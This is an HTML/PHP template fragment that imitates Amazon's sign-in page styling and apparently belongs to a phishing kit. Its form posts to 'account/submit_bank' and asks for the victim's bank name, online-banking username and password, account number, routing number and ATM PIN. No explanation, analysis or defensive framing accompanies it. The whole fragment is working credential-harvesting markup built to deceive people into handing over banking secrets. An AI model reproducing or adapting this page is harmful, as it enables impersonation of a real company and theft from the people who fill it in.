    ...
    <div id="authportal-center-section" class="a-section">
        <div id="authportal-main-section" class="a-section">
            <div class="a-section auth-pagelet-container">
                <div class="a-section">
                    <form id="ap_register_form" method="post" action="account/submit_bank" class="ap_ango_default auth-validate-form-moa auth-real-time-validation" data-fwcim-id="aairZLRX">
                        <div class="a-box a-spacing-extra-large">
                            <div class="a-box-inner">
                                <center><h1 class="a-spacing-small"><?= enc($elang['1']); ?></h1></center>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['2']); ?></label>
                                    <input type="text" maxlength="100" id="ap_customer_name" autocomplete="off" name="bankname" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" autofocus required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['3']); ?></label>
                                    <input type="text" maxlength="100" id="ap_customer_name" autocomplete="off" name="user_bank" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['4']); ?></label>
                                    <input type="password" maxlength="100" id="ap_customer_name" autocomplete="off" name="pass_bank" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['5']); ?></label>
                                    <input type="text" maxlength="100" id="ap_customer_name" autocomplete="off" name="anum" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" onkeypress="return hanyaAngka(event)" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['6']); ?></label>
                                    <input type="text" maxlength="100" id="ap_customer_name" autocomplete="off" name="rnum" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" onkeypress="return hanyaAngka(event)" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($elang['7']); ?></label>
                                    <input type="password" maxlength="100" id="ap_customer_name" autocomplete="off" name="atmpin" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" onkeypress="return hanyaAngka(event)" required>
                                </div>
                                ...
                                <div class="a-section a-spacing-extra-large">
                                    ...
                                    <span class="default-text"><?= enc($elang['btn']); ?></span>
                                    </span></span></span>
                                </div>
                            </div>
                        </div>
